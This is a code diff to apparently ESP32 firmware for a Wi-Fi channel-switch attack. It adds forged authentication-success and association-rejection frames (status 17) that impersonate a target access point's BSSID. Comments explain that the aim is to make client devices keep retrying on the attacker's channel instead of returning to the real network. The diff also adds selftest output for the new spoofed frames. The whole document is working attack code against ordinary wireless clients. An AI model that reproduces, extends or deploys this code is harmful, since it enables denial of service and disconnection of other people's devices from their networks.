@@ -53,6 +53,12 @@ uint8_t s_rsn_len;
 uint16_t s_capability;
 
 uint32_t s_frames;
+uint32_t s_auth_replies;   // Auth requests answered with "success"
+uint32_t s_assoc_rejects;  // Assoc/Reassoc requests answered with a failure code
+// Status code 17 = "Association denied because AP is unable to handle additional
+// associated STAs". The client authenticates fine but never associates, so it
+// keeps retrying on this channel instead of going back to the real AP.
+const uint16_t kAssocFailStatus = 17;
 uint32_t s_cycles;
 bool s_auto_channel;   // announced channel comes from the opposite band
 bool s_loop;           // repeat announce+hold until stopped
@@ -204,6 +210,45 @@ void send_csa_round(uint8_t count) {
     tx(frame, build_beacon(frame, s_ap_channel, true, count));
 }
 
+// Auth response: algorithm 0 (open), sequence 2, status 0 = success.
+size_t build_auth_resp(uint8_t* frame, const uint8_t sta[6]) {
+    memset(frame, 0, 32);
+    frame[0] = 0xB0;  // management, subtype 11 = authentication
+    frame[1] = 0x00;
+    memcpy(frame + 4, sta, 6);
+    memcpy(frame + 10, s_bssid, 6);
+    memcpy(frame + 16, s_bssid, 6);
+    frame[22] = 0xF0;
+    frame[23] = 0xFF;
+    frame[24] = 0;  // auth algorithm: open system
+    frame[25] = 0;
+    frame[26] = 2;  // auth transaction sequence: 2 (response to seq 1)
+    frame[27] = 0;
+    frame[28] = 0;  // status: success
+    frame[29] = 0;
+    return 30;
+}
+
+// Assoc response: capability + status (failure) + aid.
+size_t build_assoc_resp(uint8_t* frame, const uint8_t sta[6]) {
+    memset(frame, 0, 32);
+    frame[0] = 0x10;  // management, subtype 1 = association response
+    frame[1] = 0x00;
+    memcpy(frame + 4, sta, 6);
+    memcpy(frame + 10, s_bssid, 6);
+    memcpy(frame + 16, s_bssid, 6);
+    frame[22] = 0xF0;
+    frame[23] = 0xFF;
+    const uint16_t cap = s_capability != 0 ? s_capability : 0x0411;
+    frame[24] = (uint8_t)(cap & 0xFF);
+    frame[25] = (uint8_t)(cap >> 8);
+    frame[26] = (uint8_t)(kAssocFailStatus & 0xFF);
+    frame[27] = (uint8_t)(kAssocFailStatus >> 8);
+    frame[28] = 0;  // AID 0: never associated
+    frame[29] = 0;
+    return 30;
+}
+
 void send_clone_beacon(void) {
     uint8_t frame[140];
     tx(frame, build_beacon(frame, s_new_channel, false, 0));
@@ -211,8 +256,8 @@ void send_clone_beacon(void) {
 
 }  // namespace
 
-bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hold_seconds,
-               bool loop) {
+// hold_ms: how long each round keeps impersonating the AP on the new channel.
+bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hold_ms, bool loop) {
     const uint8_t* bssid = WiFi.BSSID(index);
     if (bssid == nullptr) {
         return false;
@@ -233,7 +278,9 @@ bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hol
     s_rsn_len = 0;
     s_capability = 0;
     s_frames = 0;
-    s_hold_ms = (uint32_t)hold_seconds * 1000UL;
+    s_auth_replies = 0;
+    s_assoc_rejects = 0;
+    s_hold_ms = hold_ms < 100 ? 100 : hold_ms;
     s_hold_until = millis() + s_hold_ms;
 
     esp_wifi_set_channel(s_ap_channel, WIFI_SECOND_CHAN_NONE);
@@ -294,7 +341,38 @@ void csa_step(void) {
 }
 
 void csa_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
-    if (s_phase != CSA_ANNOUNCE || len < 24) {
+    if (len < 24) {
+        return;
+    }
+
+    // HOLD phase: we are pretending to be the AP on the new channel. Answer the
+    // client's auth so it believes it is talking to its network, then refuse the
+    // association -- it stays here retrying instead of failing back to the real AP.
+    if (s_phase == CSA_HOLD && type == 0) {
+        const uint8_t* dest = frame + 4;
+        const uint8_t* src = frame + 10;
+        if (memcmp(dest, s_bssid, 6) == 0 && memcmp(src, s_bssid, 6) != 0) {
+            uint8_t reply[32];
+            if (subtype == 11) {  // authentication request
+                const size_t n = build_auth_resp(reply, src);
+                if (esp_wifi_80211_tx(WIFI_IF_STA, reply, n, false) == ESP_OK) {
+                    s_frames++;
+                    s_auth_replies++;
+                }
+                return;
+            }
+            if (subtype == 0 || subtype == 2) {  // assoc / reassoc request
+                const size_t n = build_assoc_resp(reply, src);
+                if (esp_wifi_80211_tx(WIFI_IF_STA, reply, n, false) == ESP_OK) {
+                    s_frames++;
+                    s_assoc_rejects++;
+                }
+                return;
+            }
+        }
+    }
+
+    if (s_phase != CSA_ANNOUNCE) {
         return;
     }
     const uint8_t* dest = frame + 4;
@@ -317,8 +395,16 @@ void csa_selftest(void) {
         memcpy(s_ssid, "CSATEST", 7);
         s_ssid_len = 7;
     }
+    // The dump must follow the same rule as a real run: pretend the target is a
+    // 2.4 GHz AP unless a 5 GHz channel is already configured, then announce a
+    // random channel from the *opposite* band. (Hard-coding 6 here is what made
+    // the dump look like it announced a 2.4 GHz channel for a 2.4 GHz AP.)
+    if (s_ap_channel == 0) {
+        s_ap_channel = 1;
+    }
     if (s_new_channel == 0) {
-        s_new_channel = 6;
+        s_auto_channel = true;
+        s_new_channel = pick_opposite_band_channel();
     }
     // Selftest may run before any CSA start, so give the dump a readable BSSID
     // instead of 00:00:00:00:00:00 (a real start always comes from SCAN).
@@ -328,12 +414,46 @@ void csa_selftest(void) {
     }
     uint8_t frame[140];
 
+    Serial.print("CSATEST band ap_ch=");
+    Serial.print((unsigned)s_ap_channel);
+    Serial.print(s_ap_channel <= 14 ? "(2.4G)" : "(5G)");
+    Serial.print(" new_ch=");
+    Serial.print((unsigned)s_new_channel);
+    Serial.print(s_new_channel <= 14 ? "(2.4G)" : "(5G)");
+    Serial.print(" auto=");
+    Serial.println(s_auto_channel ? 1 : 0);
+
     const size_t alen = build_csa_action(frame, kBroadcast, s_new_channel, 5);
     Serial.printf("CSATEST action len=%u cat=%u act=%u mode=%u nch=%u cnt=%u\n", (unsigned)alen,
                   (unsigned)frame[24], (unsigned)frame[25], (unsigned)frame[26],
                   (unsigned)frame[27], (unsigned)frame[28]);
     Serial.print("CSATEST action hex=");
     for (size_t i = 0; i < alen; i++) {
+        Serial.printf("%02X", frame[i]);
+    }
+    Serial.println();
+
+    const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
+    const size_t alen2 = build_auth_resp(frame, fake_sta);
+    Serial.print("CSATEST authresp len=");
+    Serial.print((unsigned)alen2);
+    Serial.print(" status=");
+    Serial.print((unsigned)(frame[28] | (frame[29] << 8)));
+    Serial.print(" hex=");
+    for (size_t i = 0; i < alen2; i++) {
+        Serial.printf("%02X", frame[i]);
+    }
+    Serial.println();
+
+    const size_t alen3 = build_assoc_resp(frame, fake_sta);
+    Serial.print("CSATEST assocresp len=");
+    Serial.print((unsigned)alen3);
+    Serial.print(" status=");
+    Serial.print((unsigned)(frame[26] | (frame[27] << 8)));
+    Serial.print(" aid=");
+    Serial.print((unsigned)(frame[28] | (frame[29] << 8)));
+    Serial.print(" hex=");
+    for (size_t i = 0; i < alen3; i++) {
         Serial.printf("%02X", frame[i]);
     }
     Serial.println();
@@ -380,6 +500,14 @@ bool csa_auto_channel(void) {
 
 uint32_t csa_cycles(void) {
     return s_cycles;
+}
+
+uint32_t csa_auth_replies(void) {
+    return s_auth_replies;
+}
+
+uint32_t csa_assoc_rejects(void) {
+    return s_assoc_rejects;
 }
 
 uint8_t csa_current_count(void) {
